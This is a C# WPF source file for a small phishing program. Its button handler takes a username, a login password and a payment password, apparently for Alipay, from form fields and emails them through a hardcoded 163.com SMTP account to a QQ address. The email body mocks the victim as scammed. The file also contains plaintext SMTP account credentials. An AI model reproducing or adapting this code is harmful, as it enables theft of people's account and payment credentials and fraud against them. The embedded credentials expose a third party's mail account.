using System;
using System.Windows;
using System.Net.Mail;


namespace WpfApplication1
{
    /// <summary>
    /// MainWindow.xaml 的交互逻辑
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
            

        }
        static string sendMail(string to, string title, string content)
        {
            string strHost = "smtp.163.com";   //STMP服务器地址
            string strAccount = "xiaosiqi11111@163.com";       //SMTP服务帐号
            string strPwd = "qwer19961218";       //SMTP服务密码
            string strFrom = "xiaosiqi11111@163.com";  //发送方邮件地址


            SmtpClient _smtpClient = new SmtpClient();
            _smtpClient.DeliveryMethod = SmtpDeliveryMethod.Network;//指定电子邮件发送方式
            _smtpClient.Host = strHost; ;//指定SMTP服务器
            _smtpClient.Credentials = new System.Net.NetworkCredential(strAccount, strPwd);//用户名和密码

            MailMessage _mailMessage = new MailMessage(strFrom, to);
            _mailMessage.Subject = title;//主题
            _mailMessage.Body = content;//内容
            _mailMessage.BodyEncoding = System.Text.Encoding.UTF8;//正文编码
            _mailMessage.IsBodyHtml = true;//设置为HTML格式
            _mailMessage.Priority = MailPriority.High;//优先级
            try
            {
                _smtpClient.Send(_mailMessage);
                return "发送成功";
            }
            catch (Exception ex)
            {
                return ex.Message;
            }
        }

        private void button_Click(object sender, RoutedEventArgs e)
        {
            string y用户名;
            string m密码;
            string z支付密码;
            if (userName.Text == ""|| userPas.Text==""||password.Text=="")
            {
                MessageBox.Show("欧尼酱，信息不能为空喔~");
            }
            else {
                y用户名 = userName.Text;
                m密码 = userPas.Text;
                z支付密码 = password.Text;
               

                Console.WriteLine(sendMail("2218085828@qq.com", "ZFB", "又有一个死肥宅被骗  " + "用户名：" + y用户名 + "密码：" + m密码 + "支付密码：" + z支付密码+ "  时间"+ DateTime.Now.ToLocalTime().ToString())); 
                MessageBox.Show("谢谢欧尼酱！ 妹妹们最爱你了~");
                userName.Text = "";
                userPas.Text = "";
                password.Text = "";
                button.Content = "谢谢欧尼酱！";
            }
        }

        private void button1_Click(object sender, RoutedEventArgs e)
        {
            Application.Current.Shutdown();
        }
       
    }
}
